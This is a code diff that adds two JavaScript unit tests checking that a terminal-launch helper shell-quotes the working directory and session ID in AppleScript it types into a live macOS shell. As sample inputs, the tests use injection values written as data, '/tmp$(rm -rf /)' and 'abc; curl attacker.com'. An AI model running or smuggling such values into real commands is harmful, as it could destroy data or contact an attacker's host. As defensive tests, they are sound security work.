@@ -103,6 +103,22 @@ describe('buildLaunchArgs — macOS guard', () => {
     assert.equal(result.type, 'spawn');
     assert.equal(result.bin, 'alacritty');
   });
+
+  it('shell-quotes cwd in the typed AppleScript command (not just escaped)', () => {
+    const malicious = '/tmp$(rm -rf /)';
+    const result = buildLaunchArgs('ghostty', sessionId, malicious, 'darwin');
+    // keystroke types this text directly into a live shell, so metacharacters
+    // must be neutralized by shell quoting, not just AppleScript string escaping.
+    assert.ok(result.script.includes("'/tmp$(rm -rf /)'"));
+    assert.ok(!result.script.includes('cd /tmp$('));
+  });
+
+  it('shell-quotes sessionId in the typed AppleScript command (not just escaped)', () => {
+    const malicious = 'abc; curl attacker.com';
+    const result = buildLaunchArgs('ghostty', malicious, cwd, 'darwin');
+    assert.ok(result.script.includes("'abc; curl attacker.com'"));
+    assert.ok(!result.script.includes('resume abc;'));
+  });
 });
 
 describe('buildLaunchArgs — error handling', () => {
